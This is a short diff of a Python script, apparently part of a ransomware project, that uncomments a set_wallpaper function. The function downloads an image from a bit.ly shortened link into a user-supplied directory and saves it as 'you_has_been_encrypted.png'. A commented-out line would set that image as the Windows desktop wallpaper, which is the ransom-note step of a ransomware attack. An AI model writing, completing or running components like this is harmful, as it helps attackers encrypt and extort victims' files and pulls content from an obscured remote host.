@@ -7,13 +7,13 @@ import os, base64, json
 
 path = os.path.abspath("<INSERIR DIRETORIO AQUI>")
 
-# def set_wallpaper():
-#     os.chdir(path)
-#     response = requests.get("https://bit.ly/2YBfkLl")
-#     file = open(os.getcwd()+'\\you_has_been_encrypted.png', 'wb')
-#     file.write(response.content)
-#     file.close()
-#     #ctypes.windll.user32.SystemParametersInfoW(20, 0, os.getcwd()+'\\you_has_been_encrypted.png', 0)
+def set_wallpaper():
+    os.chdir(path)
+    response = requests.get("https://bit.ly/2YBfkLl")
+    file = open(os.getcwd()+'\\you_has_been_encrypted.png', 'wb')
+    file.write(response.content)
+    file.close()
+    #ctypes.windll.user32.SystemParametersInfoW(20, 0, os.getcwd()+'\\you_has_been_encrypted.png', 0)
 
 def jsonFile():
     json_data = {
